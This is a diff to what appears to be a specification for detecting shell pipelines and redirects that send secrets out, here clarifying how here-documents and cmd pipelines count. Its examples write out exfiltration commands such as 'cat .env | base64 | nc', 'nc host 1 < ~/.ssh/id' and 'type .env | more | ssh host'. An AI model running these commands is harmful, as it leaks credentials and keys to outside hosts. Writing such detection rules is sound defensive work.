@@ -411,7 +411,11 @@ one (`scp build/pkg.tar host:/srv/`, `curl -d @payload.json https://api.example`
   `--ignore-stdin`), `openssl s_client`, `rclone rcat`, `aws s3 cp -`. A stage between them changes nothing: `cat .env | base64 | nc h
   1` is sent. A program an `xargs` or `ForEach-Object` hands its input to
   counts as a stage that reads it. The pipeline after a here-document
-  (`cat .env <<EOF | nc host 1`) is read as one.
+  (`cat .env <<EOF | nc host 1`, `cat .env <<EOF | base64 | nc host 1`) is the
+  same pipeline as the command before it, however many stages it has; so is a
+  here-document after a pipeline (`echo hi | cat .env - <<EOF | nc host 1`),
+  whose stages come first. In cmd, `type .env | more | ssh host` is one
+  pipeline of three stages, as in the other shells.
 - **A redirect.** A secret redirected onto the input of one of those
   (`nc host 1 < ~/.ssh/id`, in cmd `ssh host < .env`), or a command's output
   redirected to `/dev/tcp/host/port` or `/dev/udp/…`. Only bash's own redirect
